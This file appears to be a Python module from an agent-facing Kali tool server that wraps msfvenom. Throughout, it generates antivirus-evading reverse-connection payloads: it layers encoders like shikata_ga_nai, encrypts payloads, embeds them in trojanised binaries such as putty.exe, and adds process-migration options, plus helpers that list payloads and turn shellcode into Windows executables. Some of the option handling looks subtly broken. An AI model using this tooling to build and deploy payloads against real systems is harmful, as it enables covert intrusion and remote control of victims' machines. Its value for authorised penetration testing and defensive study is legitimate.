import os
import tempfile
from ..tools.base import run_tool


ENCODERS = {
    "x86": "x86/shikata_ga_nai",
    "x64": "x64/xor",
    "cmd": "cmd/powershell_base64",
    "python": "generic/none",
}

EVASION_TEMPLATES = {
    "putty": "/usr/share/windows-binaries/putty.exe",
    "plink": "/usr/share/windows-binaries/plink.exe",
    "notepad": "notepad.exe",
}


def craft_evasive_payload(
    payload: str,
    lhost: str,
    lport: str,
    fmt: str = "exe",
    encoder: str = "auto",
    iterations: int = 5,
    encrypt: str = "",
    encrypt_key: str = "",
    template: str = "",
    inject_process: str = "",
    platform: str = "",
    arch: str = "",
    badchars: str = "\\x00",
    obfuscate: bool = False,
    opts: str = "",
) -> str:
    if not payload or not lhost or not lport:
        return "payload, lhost, and lport are required"

    cmd = ["msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}"]

    if fmt:
        cmd.extend(["-f", fmt])

    chosen_encoder = encoder
    if encoder == "auto":
        if "x64" in payload:
            chosen_encoder = ENCODERS["x64"]
        elif "x86" in payload or "windows" in payload:
            chosen_encoder = ENCODERS["x86"]
        elif "python" in payload:
            chosen_encoder = ENCODERS["python"]
        else:
            chosen_encoder = "generic/none"

    if chosen_encoder and chosen_encoder != "generic/none":
        cmd.extend(["-e", chosen_encoder])
        if iterations > 0:
            cmd.extend(["-i", str(max(iterations, 1))])

    if badchars:
        cmd.extend(["-b", badchars])

    if platform:
        cmd.extend(["--platform", platform])

    if arch:
        cmd.extend(["-a", arch])

    if template:
        if template in EVASION_TEMPLATES:
            template = EVASION_TEMPLATES[template]
        cmd.extend(["-x", template])

    if encrypt:
        cmd.extend(["--encrypt", encrypt])
        if encrypt_key:
            cmd.extend(["--encrypt-key", encrypt_key])

    if inject_process:
        cmd.extend(["--prepend-fork" if inject_process == "fork" else f"PrependMigrateProc={inject_process}"])

    if obfuscate:
        cmd.extend(["--encoder-space", "4096"])

    if opts:
        cmd.extend(opts.split())

    tmpdir = tempfile.mkdtemp(prefix="kali_mcp_")
    outpath = os.path.join(tmpdir, f"payload.{fmt}")
    cmd.extend(["-o", outpath])

    result = run_tool(cmd, timeout=180)
    file_info = ""
    if os.path.exists(outpath):
        size = os.path.getsize(outpath)
        file_info = f"\n[payload saved] {outpath} ({size} bytes)"

    return result + file_info


def list_payloads(platform: str = "", arch: str = "", keyword: str = "") -> str:
    cmd = ["msfvenom", "-l", "payloads"]
    if platform:
        cmd.extend(["--platform", platform])
    if arch:
        cmd.extend(["-a", arch])
    result = run_tool(cmd, timeout=30)
    if keyword:
        lines = result.split("\n")
        header = lines[:2]
        filtered = [l for l in lines[2:] if keyword.lower() in l.lower()]
        return "\n".join(header + filtered[:50])
    return result


def list_encoders(platform: str = "", arch: str = "") -> str:
    cmd = ["msfvenom", "-l", "encoders"]
    if platform:
        cmd.extend(["--platform", platform])
    if arch:
        cmd.extend(["-a", arch])
    return run_tool(cmd, timeout=30)


def list_encryption() -> str:
    return run_tool(["msfvenom", "-l", "encrypt"], timeout=30)


def shellcode_to_exe(shellcode_file: str, arch: str = "x86", outfile: str = "") -> str:
    if not shellcode_file:
        return "shellcode_file is required"
    cmd = ["msfvenom", "-p", "generic/custom", f"PAYLOADFILE={shellcode_file}", "-a", arch, "--platform", "windows", "-f", "exe"]
    if outfile:
        cmd.extend(["-o", outfile])
    return run_tool(cmd, timeout=60)
